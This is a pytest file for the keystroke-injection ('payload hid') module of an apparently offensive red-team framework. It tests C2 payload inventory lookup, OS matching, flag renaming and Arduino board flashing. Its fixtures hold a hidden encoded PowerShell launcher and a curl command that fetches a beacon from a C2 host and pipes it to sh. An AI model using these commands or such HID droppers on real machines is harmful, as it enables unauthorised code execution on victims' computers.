"""Section A — `payload hid` now reads the `generate` inventory, checks the
platform, and stops calling the destination of the typing "target".

Four defects are pinned here, each with a test that fails on the previous
behaviour:

1. `payload hid` could not use a payload `generate` had just built: the
   operator copied the command by hand from `payloads <id>`. `--from-payload
   <id>` closes the loop (unique prefix, inventory listed on a miss).
2. A payload built for one OS could be typed into another in silence. The
   inventory records the platform; it is now compared with `--type-into`.
3. `--target` on this command means the OS the board types INTO, while
   everywhere else in Phantom "target" is the engagement host. `--type-into`
   is the new spelling and `--target` a deprecated alias that says so.
4. A POSIX-only command (`chmod`, `apt`, `systemctl`) aimed at Windows is
   almost always a typo — but a shell command is TEXT, so it asks instead of
   blocking, and `--strict` is the explicit refusal.
"""
import os
from unittest import mock

import pytest

from phantom.modules import payload as payload_mod
from phantom.modules.payload import PayloadModule
from phantom.utils.arduino_flash import fqbn_for
from phantom.utils.hid_builder import BOARD_ALIASES, board_notes, build_hid_payload

WIN_ID = "3f2a91c4-1111-2222-3333-444455556666"
LIN_ID = "9c7e0b12-aaaa-bbbb-cccc-ddddeeeeffff"

WIN_BEACON = {
    "id": WIN_ID,
    "platform": "windows",
    "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc AAAA",
    "description": "Custom C++ Beacon (x64)",
    "source": "c2_shell",
}
LIN_BEACON = {
    "id": LIN_ID,
    "platform": "linux",
    "command": "curl -sk 'https://10.0.0.5:8443/api/v1/payload_linux?auth=T'"
               " | sh",
    "description": "Custom C++ Beacon (x64)",
    "source": "c2_shell",
}


def _inventory(monkeypatch, entries):
    monkeypatch.setattr("phantom.utils.payload_manager.get_custom_beacons",
                        lambda: list(entries))


def _run(arg, tmp_path, name="artefact"):
    """Run `payload hid <arg> --out <tmp>`, return (content-or-None, notifier)."""
    out = os.path.join(str(tmp_path), name)
    with mock.patch("phantom.modules.payload.notifier") as note:
        PayloadModule().do_hid(f"{arg} --out {out}")
    content = None
    if os.path.isfile(out):
        with open(out, encoding="utf-8") as handle:
            content = handle.read()
    return content, note


def _errors(note):
    return " ".join(str(c) for c in note.error.call_args_list)


def _warns(note):
    return " ".join(str(c) for c in note.warn.call_args_list)


class TestFromPayload:
    def test_a_full_id_types_the_command_generate_registered(
            self, tmp_path, monkeypatch):
        _inventory(monkeypatch, [WIN_BEACON])
        content, _ = _run(f"arduino --from-payload {WIN_ID} "
                          f"--type-into windows", tmp_path)
        assert content and '-Enc AAAA' in content

    def test_a_unique_prefix_is_enough(self, tmp_path, monkeypatch):
        _inventory(monkeypatch, [WIN_BEACON])
        content, _ = _run("arduino --from-payload 3f2a91c4 --type-into windows",
                          tmp_path)
        assert content and '-Enc AAAA' in content

    def test_an_ambiguous_prefix_is_refused_and_lists_the_candidates(
            self, tmp_path, monkeypatch):
        second = dict(WIN_BEACON, id="3f2a91c4-9999-0000-1111-222233334444")
        _inventory(monkeypatch, [WIN_BEACON, second])
        content, note = _run("arduino --from-payload 3f2a91c4 --type-into "
                            "windows", tmp_path)
        assert content is None
        assert "ambiguous" in _errors(note)
        # both candidates are named, so the operator can pick one
        assert WIN_ID in " ".join(str(c) for c in note.info.call_args_list)

    def test_an_unknown_id_is_refused_and_lists_the_inventory(
            self, tmp_path, monkeypatch):
        _inventory(monkeypatch, [WIN_BEACON])
        content, note = _run("arduino --from-payload deadbeef --type-into "
                            "windows", tmp_path)
        assert content is None
        assert "no payload with id 'deadbeef'" in _errors(note)
        assert "available payloads" in " ".join(
            str(c) for c in note.info.call_args_list)

    def test_an_empty_inventory_says_to_generate_first(self, tmp_path,
                                                      monkeypatch):
        _inventory(monkeypatch, [])
        content, note = _run("arduino --from-payload anything", tmp_path)
        assert content is None
        assert "generate" in _errors(note)

    def test_an_inline_command_plus_from_payload_is_refused(
            self, tmp_path, monkeypatch):
        _inventory(monkeypatch, [WIN_BEACON])
        content, note = _run("arduino 'whoami' --from-payload 3f2a91c4 "
                            "--type-into windows", tmp_path)
        assert content is None
        assert "two sources" in _errors(note)

    def test_from_payload_plus_a_stager_is_refused(self, tmp_path, monkeypatch):
        _inventory(monkeypatch, [WIN_BEACON])
        content, note = _run("arduino --from-payload 3f2a91c4 --stager windows "
                            "--type-into windows", tmp_path)
        assert content is None
        assert "pick one" in _errors(note)


class TestPlatformMatch:
    def test_a_payload_for_another_os_is_refused(self, tmp_path, monkeypatch):
        _inventory(monkeypatch, [WIN_BEACON])
        content, note = _run("arduino --from-payload 3f2a91c4 --type-into linux",
                            tmp_path)
        assert content is None
        message = _errors(note)
        assert "windows" in message and "linux" in message

    def test_the_matching_os_writes_the_artefact(self, tmp_path, monkeypatch):
        _inventory(monkeypatch, [LIN_BEACON])
        content, _ = _run("flipper --from-payload 9c7e0b12 --type-into linux",
                          tmp_path)
        assert content and "STRING curl" in content

    def test_an_unknown_platform_is_not_a_mismatch(self, tmp_path, monkeypatch):
        entry = dict(WIN_BEACON, platform="unknown")
        _inventory(monkeypatch, [entry])
        content, note = _run("arduino --from-payload 3f2a91c4 --type-into linux",
                            tmp_path)
        assert content is not None and not note.error.called

    def test_without_type_into_it_asks_for_the_os(self, tmp_path, monkeypatch):
        _inventory(monkeypatch, [LIN_BEACON])
        content, note = _run("flipper --from-payload 9c7e0b12", tmp_path)
        assert content is not None           # written: a warning, not a refusal
        assert "--type-into linux" in _warns(note)


class TestTypeInto:
    def test_type_into_picks_the_opener_of_that_os(self, tmp_path):
        content, _ = _run("flipper 'whoami' --type-into linux --run", tmp_path)
        assert content and "HOLD CTRL ALT T" in content

    def test_target_still_works_and_says_it_is_deprecated(self, tmp_path):
        content, note = _run("flipper 'whoami' --target linux --run", tmp_path)
        assert content and "HOLD CTRL ALT T" in content
        assert "deprecated alias" in _warns(note)
        assert "--type-into" in _warns(note)

    def test_the_two_spellings_must_agree(self, tmp_path):
        content, note = _run("flipper 'whoami' --type-into linux --target "
                            "windows", tmp_path)
        assert content is None
        assert "disagree" in _errors(note)

    def test_the_help_explains_the_two_meanings_in_one_place(self):
        doc = PayloadModule.do_hid.__doc__
        assert "--type-into" in doc
        assert "TYPE INTO" in doc                  # the OS it types into
        assert "targets add" in doc                # the engagement target
        assert "DEPRECATED" in doc

    def test_the_module_help_lists_the_new_flags(self):
        delivery = PayloadModule().build_commands()["DELIVERY"]
        joined = " ".join(delivery)
        assert "--from-payload" in joined and "--type-into" in joined


class TestMismatchIsSuggestedNotBlocked:
    def _confirm(self, monkeypatch, answer):
        calls = []
        monkeypatch.setattr(payload_mod, "_confirm_typing",
                            lambda: calls.append(True) or answer)
        return calls

    def test_a_posix_command_for_windows_warns_then_asks(self, tmp_path,
                                                        monkeypatch):
        calls = self._confirm(monkeypatch, True)
        content, note = _run("pico 'chmod +x /tmp/x' --type-into windows",
                             tmp_path)
        assert calls == [True]                     # it asks
        assert content is not None                 # and proceeds on "yes"
        assert "looks POSIX" in _warns(note)

    def test_declining_writes_nothing(self, tmp_path, monkeypatch):
        self._confirm(monkeypatch, False)
        content, note = _run("pico 'chmod +x /tmp/x' --type-into windows",
                             tmp_path)
        assert content is None
        assert "cancelled" in _warns(note)

    def test_strict_refuses_without_asking(self, tmp_path, monkeypatch):
        calls = self._confirm(monkeypatch, True)
        content, note = _run("pico 'chmod +x /tmp/x' --type-into windows "
                             "--strict", tmp_path)
        assert content is None
        assert calls == []                         # never prompts
        assert "--strict" in _errors(note)

    def test_a_matching_command_never_asks(self, tmp_path, monkeypatch):
        calls = self._confirm(monkeypatch, False)
        content, note = _run("pico 'whoami' --type-into linux", tmp_path)
        assert content is not None and calls == [] and not note.error.called

    def test_a_windows_command_for_windows_never_asks(self, tmp_path,
                                                     monkeypatch):
        calls = self._confirm(monkeypatch, False)
        content, _ = _run("pico 'powershell -Enc AAAA' --type-into windows",
                          tmp_path)
        assert content is not None and calls == []

    def test_a_word_inside_a_longer_word_is_not_a_signal(self):
        from phantom.utils.hid_builder import mismatch_hints
        # `adapt`/`chmod` inside another token: matched as whole words only
        assert mismatch_hints("adapt --help", "windows") == ()
        assert mismatch_hints('echo "chmod is a command"', "linux") == ()


class TestLeonardo:
    def test_the_variant_builds_the_arduino_sketch(self, tmp_path):
        content, _ = _run("leonardo 'whoami' --type-into windows", tmp_path)
        assert content and "#include <Keyboard.h>" in content

    def test_the_variant_keeps_its_own_name_in_the_artefact_path(
            self, tmp_path, monkeypatch):
        monkeypatch.setattr("phantom.utils.paths.data_dir",
                            lambda: str(tmp_path))
        with mock.patch("phantom.modules.payload.notifier"):
            PayloadModule().do_hid("leonardo 'whoami' --type-into windows")
        assert os.path.isfile(os.path.join(
            str(tmp_path), "vectors", "leonardo_phantom_hid",
            "leonardo_phantom_hid.ino"))

    def test_flash_uses_the_leonardo_fqbn(self, tmp_path, monkeypatch):
        seen = {}

        class _Result:
            ok = True
            steps = ()

            def summary(self):
                return "flashed"

        def _fake(sketch_dir, port, *, fqbn="", cli=None, **kw):
            seen.update(sketch_dir=sketch_dir, port=port, fqbn=fqbn)
            return _Result()

        monkeypatch.setattr("phantom.utils.arduino_flash.flash_sketch", _fake)
        out = os.path.join(str(tmp_path), "leonardo_phantom_hid",
                           "leonardo_phantom_hid.ino")
        with mock.patch("phantom.modules.payload.notifier"):
            PayloadModule().do_hid(f"leonardo 'whoami' --type-into windows "
                                   f"--flash COM5 --out {out}")
        assert seen["fqbn"] == "arduino:avr:leonardo"
        assert seen["port"] == "COM5"

    def test_an_explicit_fqbn_still_wins(self, tmp_path, monkeypatch):
        seen = {}

        class _Result:
            ok = True
            steps = ()

            def summary(self):
                return "flashed"

        monkeypatch.setattr("phantom.utils.arduino_flash.flash_sketch",
                            lambda d, p, *, fqbn="", cli=None, **kw:
                            seen.update(fqbn=fqbn) or _Result())
        out = os.path.join(str(tmp_path), "sk", "sk.ino")
        with mock.patch("phantom.modules.payload.notifier"):
            PayloadModule().do_hid(f"leonardo 'whoami' --type-into windows "
                                   f"--flash COM5 --fqbn arduino:avr:micro "
                                   f"--out {out}")
        assert seen["fqbn"] == "arduino:avr:micro"

    def test_a_plain_arduino_board_still_defaults_to_the_old_fqbn(self):
        assert fqbn_for("arduino") == ""
        assert fqbn_for("leonardo") == "arduino:avr:leonardo"
        assert fqbn_for("pro-micro") == "arduino:avr:micro"
        assert fqbn_for("teensy") == ""

    def test_the_aliases_build_the_same_artefact_as_the_family(self):
        for alias, family in BOARD_ALIASES.items():
            assert build_hid_payload(alias, "whoami").board == family
            assert board_notes(alias) == board_notes(family)

    def test_an_unknown_board_is_still_refused_and_lists_the_variants(self):
        with pytest.raises(ValueError) as excinfo:
            build_hid_payload("teensy", "whoami")
        assert "leonardo" in str(excinfo.value)
